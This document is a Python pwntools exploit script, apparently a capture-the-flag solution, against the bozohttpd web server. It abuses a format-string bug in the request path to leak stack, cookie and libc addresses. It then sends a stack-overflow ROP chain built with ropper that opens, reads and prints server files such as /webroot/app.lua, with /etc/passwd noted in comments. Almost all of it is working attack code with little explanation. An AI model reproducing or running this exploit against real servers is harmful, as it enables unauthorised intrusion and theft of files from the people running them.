from pwn import *
from ropper import RopperService
context.arch = 'amd64'

t = 'remote'

HOST= '127.0.0.1'
PORT= 8080

if t == 'remote':
	HOST = 'xxxxxx'
	PORT = 8080

def get_libc_path():
	if t == 'local':
		return "./libs/libc-2.24.so"
	if t == 'remote':
		return "./libs/libc-2.25.so"


libc=ELF(get_libc_path())

e=ELF("./bozohttpd")

def request(payload, debug = False):
	r=connect(HOST,PORT)
	
	if debug and t=='local':
		#open new window and attach gdb
		commands=["bp 0x000000000040809F","c"]
		gdb.attach("bozohttpd",gdbscript="\n".join(commands))
	
	payload=payload.encode("hex")
	r.send("GET /00"+payload+" HTTP/1.1\r\n")
	r.send("Host: http://localhost:8080\r\n")
	r.send("\r\n")
	
	page = r.recvuntil("</html>\n")
	more = r.recvall()
	if more.strip():
		print str(more.strip())
	r.close()
	return page.split(":")[5]

def leak_cookie():
	payload = "%88$p"
	blob = request(payload)
	return int(blob[2:],16)
	
def leak_stack():
	payload = "%8$p"
	blob = request(payload)
	return int(blob[2:],16)	

def leak_byte(addr):
	payload="%57$s\x00"
	payload+="a"*(256-len(payload))
	payload+=p64(addr)

	blob = request(payload)
	if blob=="":
		return 0x00
	
	return u8(blob[0])
    
def leak_8B(addr):
	r = 0x0
	for a in range(addr+7,addr-1,-1):
		r*=0x100
		r+=leak_byte(a)
    
	return r
	

#global instance of ropper
rs = None

def ropper_init():
	global rs

	# options for ropper
	options = {'color' : False,     # if gadgets are printed, use colored output: default: False
            'badbytes': '',   # bad bytes which should not be in addresses or ropchains; default: ''
            'all' : False,      # Show all gadgets, this means to not remove double gadgets; default: False
            'inst_count' : 6,   # Number of instructions in a gadget; default: 6
            'type' : 'rop',     # rop, jop, sys, all; default: all
            'detailed' : False} # if gadgets are printed, use detailed output; default: False

	rs = RopperService(options)
	rs.addFile(get_libc_path())
	rs.setArchitectureFor(name=get_libc_path(), arch='x86_64')
	
	print "loading gadgets from libc..."
	rs.loadGadgetsFor() 


def ropper_find_gadget(gadget_str):
	
	for file, gadget in rs.search(search=gadget_str):
		print "gadget found: "+gadget_str
		return gadget.address
		
#leak any address pointing to the stack to overcome ASLR
leaked_stack_addr = leak_stack()
print "leaked stack addr "+hex(leaked_stack_addr)

#compute address of our payload on the stack
#distance between leaked pointer and our payload is always the same
payload_addr = leaked_stack_addr - 0x5c0 + 0x260
print "address of our payload = " + hex(payload_addr)

#leak stack cookie
cookie = leak_cookie()
print "leaked stack cookie = " + hex(cookie)
    
#leak some libc function to compute address of libc base
setsockopt_addr = leak_8B(e.got['setsockopt'])
print "setsockopt = " + hex(setsockopt_addr)

libc_base = setsockopt_addr - libc.symbols["setsockopt"]

print "address of libc base = " + hex(libc_base)

#find all necessary gadgets
ropper_init()
pop_rax_addr = ropper_find_gadget('pop rax; ret;') + libc_base
pop_rdi_addr = ropper_find_gadget('pop rdi; ret;') + libc_base
pop_rsi_addr = ropper_find_gadget('pop rsi; ret;') + libc_base
pop_rdx_addr = ropper_find_gadget('pop rdx; ret;') + libc_base
syscall_addr = ropper_find_gadget('syscall; ret;') + libc_base

payload = "a"*504+p64(cookie)+"a"*8

def get_rop_syscall(sys_num, arg1=None, arg2=None, arg3=None):
	s = ""
	s += p64(pop_rax_addr)
	s += p64(sys_num)
	if not arg1 is None:
		s += p64(pop_rdi_addr)
		s += p64(arg1)
	if not arg2 is None:
		s += p64(pop_rsi_addr)
		s += p64(arg2)
	if not arg3 is None:
		s += p64(pop_rdx_addr)
		s += p64(arg3)
	s += p64(syscall_addr)
	return s

#ROP chain to make executable stack (by mprotect)
#open open('/etc/passwd',O_RDONLY /* = 0 */,0)
filename_addr = payload_addr + 0x308
payload += get_rop_syscall(constants.SYS_open, filename_addr, constants.O_RDONLY, 0x0)

#read the content of the fileto writable memory
#read(fd, memory_w, size)
writable_addr = 0x0000000000614480
max_size = 0x500
fd = 5
payload += get_rop_syscall(constants.SYS_read, fd, writable_addr, max_size)

#write contents of the bufor to the stdout
#write(stdout, memory_w, size)
stdout = 1
payload += get_rop_syscall(constants.SYS_write, stdout, writable_addr, max_size)

#exit program nicely
#exit(0)
payload += get_rop_syscall(constants.SYS_exit, 0x0)

#add path of file

#payload += "/proc/self/cmdline\x00" #first let's discover path to the webapplication file
payload += "/webroot/app.lua\x00"
#payload += "/etc/passwd\x00" #this does not work because of selinux

request(payload, debug=False)

